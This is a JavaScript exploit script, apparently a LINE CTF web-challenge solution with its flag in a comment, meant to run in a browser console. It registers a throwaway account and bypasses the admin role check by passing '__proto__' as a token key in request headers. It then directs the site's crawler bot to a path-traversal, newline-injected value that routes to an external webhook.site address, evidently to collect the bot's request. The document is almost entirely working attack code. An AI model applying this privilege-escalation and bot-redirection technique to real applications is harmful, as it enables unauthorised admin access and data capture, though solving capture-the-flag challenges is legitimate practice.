// LINECTF{7320a1b512380dd4e0452f9fc3166201}
// Run in browser console
const username = `balls${Math.round(Math.random()*10000)}`;
const password = "11";
const errorCode = `../../%0A/webhook.site/4f858ea1-7b1d-4e60-be16-5394a6aa673a`.replaceAll("-", "%2D");

// Register
await fetch(`/api/auth/register`, {
  "headers": {
    "content-type": "application/json",
  },
  "body": JSON.stringify({ name: username, password}),
  "method": "POST",
}).then(res => res.text());

// Login and escalate to admin
await fetch(`/api/auth/callback/credentials`, {
  "headers": {
    "content-type": "application/x-www-form-urlencoded",
    "x-user-token-key": "__proto__",
    "x-user-token-value": "{}", // Not global prototype pollution, just makes Object.keys() return only 2, bypassing the role check
  },
  "body": new URLSearchParams({
    csrfToken: JSON.parse(await fetch(`/api/auth/csrf`).then(res => res.text())).csrfToken,
    name: username,
    password
  }),
  "method": "POST",
});

// Tell bot to log in as admin and visit page
await fetch(`/api/bot/crawl`, {
  "headers": {
    "content-type": "application/json"
  },
  "body": JSON.stringify({ name: username, password, errorCode }),
  "method": "POST",
});